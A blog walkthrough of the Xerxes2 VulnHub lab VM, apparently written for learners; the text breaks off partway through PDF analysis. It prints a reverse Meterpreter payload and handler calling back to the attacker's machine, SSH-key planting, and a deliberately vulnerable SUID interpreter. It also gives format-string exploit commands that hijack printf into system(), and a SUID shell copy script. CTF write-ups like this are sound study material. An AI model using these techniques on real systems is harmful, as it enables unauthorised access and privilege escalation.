---
author: recrudesce
comments: false
date: 2014-08-08 12:16:46+00:00
layout: post
slug: the-glory-of-the-many-demands-your-capture-or-destruction
title: The Glory of The Many Demands your Capture or Destruction.
wordpress_id: 183
categories:
- VM's
tags:
- barrebas
- bastard
- evil
- vm
- vulnhub
- xerxes
---

It's been a long wait, but [barrebas](http://twitter.com/barrebas) released [Xerxes2 on Vulnhub](http://vulnhub.com/entry/xerxes-2,97/). I've not broken into Xerxes1, so I figured what the hell, lets give this a go. It might take me ages, but it's all a learning curve, right ?  Here's how I became the first person to get root

<blockquote>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)

Yup. [#vulnhub](https://twitter.com/hashtag/vulnhub?src=hash) [#xerxes2](https://twitter.com/hashtag/xerxes2?src=hash) [@barrebas](https://twitter.com/barrebas) [@VulnHub](https://twitter.com/VulnHub)
> 
> -- Russ Watts (@recrudesce) [August 8, 2014](https://twitter.com/recrudesce/statuses/497695207270658048)</blockquote>




<!-- more -->


## Taking a Sneaky Peaky


Usual stuff here, it makes sense to do some enumeration. The standard route is to start off with an NMAP scan


``` bash

root@pwk:~# nmap -sS -T4 -O --script banner 192.168.0.102

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-04 15:09 BST
Nmap scan report for 192.168.0.102
Host is up (0.00032s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp   open  http
111/tcp  open  rpcbind
4444/tcp open  krb524
| banner: //OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSs
|_uMDM1ODo9QUNG\x0ASEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKa...
8888/tcp open  sun-answerbook
MAC Address: 08:00:27:FA:1A:A6 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.46%E=4%D=8/4%OT=22%CT=1%CU=33675%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=53DF942E%P=i686-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds
root@pwk:~#
```


OK, so we have SSH, HTTP, RPC bind, 4444 and 8888. Port 4444 has returned a banner, which looks like an encoded string. We can get the full string using netcat.


``` bash

root@pwk:~# nc -nv 192.168.0.102 4444
nc: 192.168.0.102 4444 open
//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
SEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKapq66ws7W4ur3Bw8bIy83Q0tXX
2tzf4eTm6evu8PP1+Pr9AAAAOUxBTUUzLjk5cgFuAAAAAAAAAAAUQCQEdSIAAEAAAZw9c+tDPgAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/zgMQAJiwOAClPQAEKEPV6vQ80
y3mm7PwTcTcXMesnZpqNXv3jxgVjyJ8MAAcI2DgPBxYueiIlbvfu73/y7vwn+7u7/+737u7v+6Ii
Ilf/7u///6O7u73/6IiIjv///+7u4oYiJ/u7u98ILi573//oiVuiInvoLnvoiECguLi57u7i4oKC
goKJUuKCgoZUu9y73wiI5Yue9wHAKAAYAMBcG4uLuHrhC0gNGRNptRqIxGIF9hY0ZCM8qOkBjB0f
z4qGhjW3XS8TqAboGJvfwWD/84LEKjYLupm/maACFJixkWAohA3YkmgtyB3CQDRcSgRcB7AAYyKY
AaPGy4sstmhFxWglI0GVLxFUi4cJwihomIWErHeQEghuZlE6YGi3fmJIFAyWXDxw3ZFM3dPW6e5c
J9TGB9I0SdqBmedSdkFWdkOnL5oZm5mYGajSim9NFaka6SC7tN1IX6btnETBj5oal90kVJLSTq1W
U6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnAkhKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z
gsQVLLvqfCncgAGp63vV7uMMyHQFDBiFIHAAmYcCoAUAvCliDGiFVTF4tGJX0ZhZRu6SKnHyp0EE
EEUDxggaIpJIN7n1mzpIKPmq1nVKoJJpqoKSdq0EJmtNbMk7otMUbpKQQTdJ90mNEkkltTUiigtS
aKzaqy3dBNlJVoJKZabpMy6K0F0JitTMgi6zZdSqW1ebuxx1vUq6Cl3NqTs9b11O15qg2kMkIoER

*********************** Hundreds of lines later ****************************

Ql1KnTmDiAWivLiumNGocdxek7ovpCS2lxTBBQjoSENSSVPTyhUhqhbhDi7hglQCqQZymkiwbIYJ
okFFxPwG0kxBTUUzLjk5LjWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqv/zgsT3L2wV3MAJn1iqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
root@pwk:~# 
```


![](http://www.hencewise.com/wordpress/wp-content/uploads/wide-eyes.gif)

Well that was a lot more than I expected. But the = at the end screams Base64, so I need to copy the banner text into a text file (I don't need to show you this) and a-decrypting and hexediting I shall go.


``` bash

root@pwk:~# base64 -d in.txt > out.bin
root@pwk:~# hexedit out.bin

00000000   FF F3 80 C4  00 00 00 00  00 00 00 00  00 49 6E 66  6F 00 00 00  0F 00 00 01  .............Info.......
00000018   F8 00 01 9C  3D 00 03 06  08 0B 0D 10  12 15 17 1A  1C 1F 21 24  26 29 2B 2E  ....=.............!$&)+.
00000030   30 33 35 38  3A 3D 41 43  46 48 4B 4D  50 52 55 57  5A 5C 5F 61  64 66 69 6B  0358:=ACFHKMPRUWZ\_adfik
00000048   6E 70 73 75  78 7A 7D 81  83 86 88 8B  8D 90 92 95  97 9A 9C 9F  A1 A4 A6 A9  npsuxz}.................
00000060   AB AE B0 B3  B5 B8 BA BD  C1 C3 C6 C8  CB CD D0 D2  D5 D7 DA DC  DF E1 E4 E6  ........................
00000078   E9 EB EE F0  F3 F5 F8 FA  FD 00 00 00  39 4C 41 4D  45 33 2E 39  39 72 01 6E  ............9LAME3.99r.n
00000090   00 00 00 00  00 00 00 00  14 40 24 04  75 22 00 00  40 00 01 9C  3D 73 EB 43  .........@$.u"..@...=s.C
000000A8   3E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  >.......................
000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  FF F3 80 C4  00 26 2C 0E  .....................&,.
000000D8   00 29 4F 40  01 0A 10 F5  7A BD 0F 34  CB 79 A6 EC  FC 13 71 37  17 31 EB 27  .)O@....z..4.y....q7.1.'
000000F0   66 9A 8D 5E  FD E3 C6 05  63 C8 9F 0C  00 07 08 D8  38 0F 07 16  2E 7A 22 25  f..^....c.......8....z"%
00000108   6E F7 EE EF  7F F2 EE FC  27 FB BB BB  FF EE F7 EE  EE EF FB A2  22 22 57 FF  n.......'...........""W.
00000120   EE EF FF FF  A3 BB BB BD  FF E8 88 88  8E FF FF FF  EE EE E2 86  22 27 FB BB  ...................."'..
00000138   BB DF 08 2E  2E 7B DF FF  E8 89 5B A2  22 7B E8 2E  7B E8 88 40  A0 B8 B8 B9  .....{....[."{..{..@....
00000150   EE EE E2 E2  82 82 82 82  89 52 E2 82  82 86 54 BB  DC BB DF 08  88 E5 8B 9E  .........R....T.........
00000168   F7 01 C0 28  00 18 00 C0  5C 1B 8B 8B  B8 7A E1 0B  48 0D 19 13  69 B5 1A 88  ...(....\....z..H...i...
00000180   C4 62 05 F6  16 34 64 23  3C A8 E9 01  8C 1D 1F CF  8A 86 86 35  B7 5D 2F 13  .b...4d#<..........5.]/.
```


Oooh, I spy the word LAME, which means this is an MP3. If you want to hear the MP3, you can download it [right here](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2.mp3). Not very exciting huh ?



* * *





## Windowlicker


What is interesting about this MP3 is not what you can hear, but what you can see in the waveform. Much like the demon face in Windowlicker by Aphex Twin, here we have a hidden image in the spectrogram. If you want to know how to find this, take a look at [this Lifehacker article](http://lifehacker.com/5807289/how-to-hide-secret-messages-and-codes-in-audio-files).

[![xerxes2_001](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_001.png)

This, however, is just a diversion. The image is of [Xerxes](http://shodan.wikia.com/wiki/Xerxes) from System Shock 2, but the whole MP3 is an easter egg - but a cool one none the less ! Let's move on.



* * *





## If You're Not Taking Notes, You're Not Learning.


So, with port 4444 crossed out, lets have a look at some other ports. 8888 is my next target, which returns nothing if you netcat to it, but provides an Python based Notebook application. This page also gives us an insight into the name of one of the users - delacroix.

[![xerxes2_002](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_002.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_002.png)

It is possible to run commands through this application by creating a new notebook, and prefixing all commands with !. As an example, I've created a new notebook and have run the whoami command in the screenshot below (you'll note that id didn't work)

[![xerxes2_003](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_003.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_003.png)

At this point I decided to be sneaky and make this download and run a reverse Meterpreter binary... I created my binary using msfpayload, hosted it on an internal HTTP server, and then set up a multi/handler to accept the connection.


``` bash

root@pwk:~# msfpayload linux/x86/meterpreter/reverse_tcp lhost=192.168.0.110 lport=4444 x > xerxes_4444
Created by msfpayload (http://www.metasploit.com).
Payload: linux/x86/meterpreter/reverse_tcp
 Length: 71
Options: {"LHOST"=>"192.168.0.110", "LPORT"=>"4444"}
root@pwk:~# cp xerxes_4444 /var/www
```




``` bash

root@pwk:~# msfconsole
msf > use multi/handler
msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.110
lhost => 192.168.0.110
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.0.110:4444
[*] Starting the payload handler...
```


The following command pasted into the Python notebook application downloads the binary from the HTTP server to /tmp, makes it executable, and then executes it.

[![xerxes2_004](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_004.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_004.png)

A reverse connection is received by the multi/handler, which allows us to get a shell as delacroix, but it disconnects after a certain amount of time.


``` bash

[*] Sending stage (1138688 bytes) to 192.168.0.102
[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.102:34718) at 2014-08-08 13:20:31 +0100

meterpreter > shell
Process 14990 created.
Channel 1 created.
$ id
uid=1002(delacroix) gid=1002(delacroix) groups=1002(delacroix)
$
[*] 192.168.0.102 - Meterpreter session 1 closed.  Reason: Died
```


![](http://media.giphy.com/media/8x6MVS4l7wh3O/giphy.gif)

It seems that I've been scuppered, and that Xerxes is terminating my connection, as seen on the Python Notebook page

[![xerxes2_005](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_005.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_005.png)

However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.


``` bash

root@pwk:~# ssh delacroix@192.168.0.102

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM'
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

/usr/bin/xauth:  file /home/delacroix/.Xauthority does not exist
delacroix@xerxes2:~$ 
```


![](http://img3.wikia.nocookie.net/__cb20140515210256/sailormoon/images/3/3c/Stephen-colbert-celebration-gif.gif)



* * *





## Aboard the Von Braun with Marie


![](http://img2.wikia.nocookie.net/__cb20111214193445/shodan/images/b/b0/Marie_Delacroix.png)

This is [Marie Delacroix](http://shodan.wikia.com/wiki/Marie_Delacroix) - creator of [Sarah](http://shodan.wikia.com/wiki/Sarah) which Xerxes was employed to run.

First things first, lets get a list of possible users from /etc/passwd


``` bash

delacroix@xerxes2:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash

```


The delacroix user has source code for an application in their home folder.

[c]/* found this lingering around somewhere */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF_SIZE 30000

void bf(char *program, char *buf)
{

	int programcounter = 0;
	int datapointer = 0;

	while (program[programcounter])
	{
		switch(program[programcounter])
		{
			case '.':
				printf("%c", buf[datapointer]);
				break;
			case ',':
				buf[datapointer] = getchar();
				break;
			case '>':
				datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
				break;
			case '<':
				datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
				break;
			case '+':
				buf[datapointer]++;
				break;
			case '-':
				buf[datapointer]--;
				break;
			case '[':
				if (buf[datapointer] == 0)
				{
					int indent = 1;
					while (indent)
					{
						programcounter++;

						if (program[programcounter] == ']')
						{
							indent--;
						}
						if (program[programcounter] == '[')
						{
							indent++;
						}
					}
				}
				break;
			case ']':
				if (buf[datapointer])
				{
					int indent = 1;
					while (indent)
					{
						programcounter--;

						if (program[programcounter] == ']')
						{
							indent++;
						}
						if (program[programcounter] == '[')
						{
							indent--;
						}
					}
				}
				break;
			case '#':
				// new feature
				printf(buf);
				break;
		}
		programcounter++;
	}
}

int main(int argc, char **argv)
{
	char buf[BUF_SIZE];

	if (argc < 2)
	{
			printf("usage: %s [program]\n", argv[0]);
			exit(-1);
	}

	memset(buf, 0, sizeof(buf));
	bf(argv[1], buf);

	exit(0);
}
```


It looks like some kind of interpreter - what language uses +-<>,. and # ? Well, I know for a fact that [Brainfuck](http://en.wikipedia.org/wiki/Brainfuck) uses all but #, and the source code says that # is a new function. Maybe this is a Brainfuck interpreter (please don't let it be Brainfuck). It looks like a compiled version of this code is available in /opt, so lets pass it a Hello World program to see if our assumption is true.


``` bash

delacroix@xerxes2:~$ /opt/bf "++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++."
Hello World!
delacroix@xerxes2:~$ 
```


Yup, it's Brainfuck. Shit.

![](http://files.abovetopsecret.com/files/img/gm5273ef16.gif)

However, it is owned by the polito user, and has SUID set.

The source code for the newly added # command indicates that it will be susceptible to a formatstring vulnerability - you can read about my forays in formatstr in my Hell writeup, but this one took a LOT longer. After I prodded around for a bit, I decided that I would overwrite the printf() pointer in the global offset table with the memory address of system() by calling # with a formatstring buffer, then call the newly redirected # command with a buffer of /bin/sh. This should technically run /bin/sh for me.

So, lets start basic. Here's my process of trying to find things in the stack.


``` bash

delacroix@xerxes2:~$ echo 'AAAA%17$x' | /opt/bf ',>,>,>,>,>,>,>,>,#'
AAAA24373125
delacroix@xerxes2:~$ echo 'AAA%17$xBBBB.%18$x....%19$x...' | /opt/bf ',>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#'
AAA78243731BBBBB.42424242....31252e42
delacroix@xerxes2:~$ echo 'AAAA%16$x' | /opt/bf ',>,>,>,>,>,>,>,>,#'
AAAA41414141
```


OK, so I can put things into the buffer and find them in the stack. However, there's a gotcha - ASLR is enabled on this box - we need to circumvent that. Could I write an application that has ASLR disabled, and run that, then use the system location from that and call it ? Probably... what about gdb, I know that [disables ASLR](http://www.outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/), but it also disables SUID, so that's out. Google to the rescue ! The [following site](http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home) helpfully tells me that ulimit -s unlimited disables ASLR on 32bit systems, so that's my golden ticket.

So, with ASLR temporarily disabled, I can find the location for the printf got pointer using objdump.


``` bash

delacroix@xerxes2:~$ ulimit -s unlimited
delacroix@xerxes2:~$ objdump -R /opt/bf

/opt/bf:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar
```


printf is at 08049a48. Now I have to find system(). gdb can help with that.


``` bash

delacroix@xerxes2:~$ gdb /opt/bf
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/bf...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048687
(gdb) run
Starting program: /opt/bf 

Breakpoint 1, 0x08048687 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0x40062000 <system>
(gdb) p printf
$2 = {<text variable, no debug info>} 0x4006ff50 <printf>

```


I need to overwrite 0x08049a48 with 0x40062000 - that shouldn't be too hard. I really only need to change the last 2 bytes from ff50 to 2000, which means I can do this with just one write. After lots of debugging I ended up at the following


``` bash

echo $(python -c "print '\x48\x9a\x04\x08'")%8186u%16\$hn | /opt/bf ',>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##'
```


I have many conversations with people on IRC, where I like to think aloud with people I talk to on a regular basis. c0ne helped me with the formatstr on Hell, so it was natural I'd talk to him


``` bash
[23:16:17]  <recrudesce>	delacroix@xerxes2:~$ echo "ABCD" | ./b ",>#"
[23:16:19]  <recrudesce>	returns A
[23:16:24]  <recrudesce>	echo "ABCD" | ./b ",><,>#" returns B
[23:16:30]  <recrudesce>	echo "ABCD" | ./b ",><,><,#" = C
[23:16:36]  <recrudesce>	echo "ABCD" | ./b ",><,><,><,#" = D
[23:16:38]  <recrudesce>	so...
[23:16:41]  <c0ne>	i get
[23:16:49]  <c0ne>	so it needs placeholder to print to
[23:16:56]  <c0ne>	placeholders
[23:17:06]  <c0ne>	,><,><,><,
[23:17:13]  <c0ne>	not sure how it works
[23:18:09]  <recrudesce>	echo "ABCDE" | ./b ",>,>,>,#<,<<<,>#"
[23:18:13]  <recrudesce>	ABCDABED
[23:18:55]  <recrudesce>	echo "ABCDWXYZ" | ./b ",>,>,>,#<<<,>,>,>,#"
[23:19:18]  <recrudesce>	ook, so that reads ABCD into the buffer, then prints it, goes back to the start of the buffer, and reads the next 4 characters, WXYZ
[23:19:20]  <recrudesce>	then prints that
[23:19:37]  <recrudesce>	so, all we need to do is go back to a few pointers, and re-read some further data in
[23:20:08]  <c0ne>	Oo
[23:20:11]  <recrudesce>	so, we need to make sure that the correct amount of ,> are before our first #
[23:20:18]  <recrudesce>	else we accidently read /bin/bash too
```


Many many failures were experienced at this point - and I'm talking at least 3 hours of failed executions or failed memory overwrites.  I managed to get basic command execution, but only once every 5-10 attempts would be successful due to the stack shifting ever so slightly.  Anyway, who wants to listen to my boohoo story - you came here for the answers, so here's what you have to do. Make a shell script in /tmp containing the following

[bash]
#!/bin/sh
cp /bin/sh /tmp/shell
chmod 4777 /tmp/shell[/bash]

chmod +x the file so it is executable, and then run the following


``` bash
delacroix@xerxes2:~$ echo $(python -c "print '\x48\x9a\x04\x08' + '%8186u%16\$hn;\/tmp\/123.sh\x00'") | /opt/bf ',>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#<<<<<<<<<<<<,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#'
```


It will probably throw an error, but the shell script will run and you'll end up with a copy of /bin/sh in /tmp, with the SUID bit set, which when run will elevate you to the polito user.


``` bash

1075339252delacroix@xerxes2:~$ ls -l /tmp
total 148
-rw-r--r-- 1 delacroix delacroix    53 Aug  6 12:07 file1
-rw-r--r-- 1 delacroix delacroix    61 Aug  6 13:03 file2
-rw-r--r-- 1 delacroix delacroix    49 Aug  6 12:24 file3
-rw-r--r-- 1 delacroix delacroix    49 Aug  6 12:27 file4
-rw-r--r-- 1 delacroix delacroix     5 Aug  6 12:31 file5
-rw-r--r-- 1 delacroix delacroix   253 Aug  6 12:50 file6
-rw-r--r-- 1 delacroix delacroix    73 Aug  6 13:37 file7
-rw-r--r-- 1 delacroix delacroix    49 Aug  6 13:59 file8
-rw-r--r-- 1 delacroix delacroix    44 Aug  6 13:59 file9
-rw-r--r-- 1 delacroix delacroix    11 Aug  6 14:15 filea
-rw-r--r-- 1 delacroix delacroix    11 Aug  6 14:13 fileb
-rw-r--r-- 1 delacroix delacroix    11 Aug  6 14:13 filec
-rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 gah.sh
-rwsrwxrwx 1 polito    polito    97284 Aug  6 16:15 shell
delacroix@xerxes2:~$ /tmp/shell
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) groups=1001(polito),1002(delacroix)
$
```


I then did the same deal here - echo'd my SSH public key to ~/.ssh/authorized_keys and SSH'd in as polito.

As a side note, I spoke to barrebas on IRC about my exploit route and he was able to refine it further


``` bash
[00:15:55]  <barrebas>	sweet your exploit is much smaller than mine, nice!
[00:16:01]  <recrudesce>	really ???
[00:16:19]  <barrebas>	yeah, i didn't use direct parameter addressing
[00:16:33]  <barrebas>	and i wrote 4 bytes instead of 2, yours is smarter
[00:16:54]  <recrudesce>	that's taken me hours
[00:25:48]  <barrebas>	a bit shorter still:
[00:25:50]  <barrebas>	python -c "print '\x48\x9a\x04\x08' + ';\/tmp\/123.sh;%8173u%16\$hn'" | /opt/bf ',>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##'
[00:26:08]  <recrudesce>	you know what, that looks like another one i did, but only slightly
[00:26:36]  <barrebas>	anyway, nice work
```


![](http://www.playandroid.com/wp-content/uploads/2012/04/U-Mad-Bro.jpg)



* * *





## Wandering the Operations Deck with Janice


![](http://img3.wikia.nocookie.net/__cb20111214193431/shodan/images/2/22/Janice_Polito_%28portrait%29.png)

Say hello to [Janice Polito](http://shodan.wikia.com/wiki/Janice_Polito), she's got a smirk on her hasn't she ?


``` bash
root@pwk:~# ssh polito@192.168.0.102

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM'
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

polito@xerxes2:~$ id
uid=1001(polito) gid=1001(polito) groups=1001(polito)
polito@xerxes2:~$ ls -l
total 172960
-rw-r--r-- 1 polito polito    142564 Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito  44813850 Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito     27591 Jul 16 12:19 polito.pdf

```


OK, so in /home/polito we have a PDF, a PGP'd file and an audio.txt file.  This audio.txt is being served by nc on port 4444 - surprise !


``` bash

polito@xerxes2:~$ ps aux | grep 4444
polito    2175  0.0  0.1   1936   568 ?        Ss   Aug06   0:00 /bin/sh -c while true ; do nc -l -p 4444 < /home/polito/audio.txt ; done
polito   19481  0.0  0.1   1904   640 ?        S    08:56   0:00 nc -l -p 4444

```


Sit comfortably, children, for I have a story to tell about this PDF. I transferred it to my laptop, and opened it... a blank PDF. I decided there must be something hidden in the file. Now, I must admit my PDF forensics skills are somewhat lacking. However, people like Didier Stevens make life a little easier with their little Python tools such as [pdf-parser](http://blog.didierstevens.com/programs/pdf-tools/).

I used pdf-parser to see what the PDF contained


``` bash

root@pwk:~# pdf-parser polito.pdf
PDF Comment '%PDF-1.5\n'

obj 999 0
 Type: 
 Referencing: 
 Contains stream

  <<
  >>


obj 3 0
 Type: /Page
 Referencing: 4 0 R, 2 0 R, 7 0 R

  <<
    /Type /Page
    /Contents 4 0 R
    /Resources 2 0 R
    /MediaBox [0 0 595.276 841.89]
    /Parent 7 0 R
  >>


obj 1 0
 Type: /XObject
 Referencing: 8 0 R
 Contains stream

  <<
    /Type /XObject
    /Subtype /Image
    /Width 200
    /Height 200
    /BitsPerComponent 1
    /ColorSpace [/Indexed /DeviceRGB 1 8 0 R]
    /Length 301
    /Filter /FlateDecode
  >>


obj 8 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Length 14
    /Filter /FlateDecode
  >>


obj 2 0
 Type: 
 Referencing: 5 0 R, 6 0 R, 1 0 R

  <<
    /Font
      <<
        /F15 5 0 R
        /F8 6 0 R
      >>
    /XObject
      <<
        /Im1 1 0 R
      >>
    /ProcSet [ /PDF /Text /ImageC /ImageI ]
  >>


obj 9 0
 Type: 
 Referencing: 



obj 10 0
 Type: 
 Referencing: 



obj 11 0
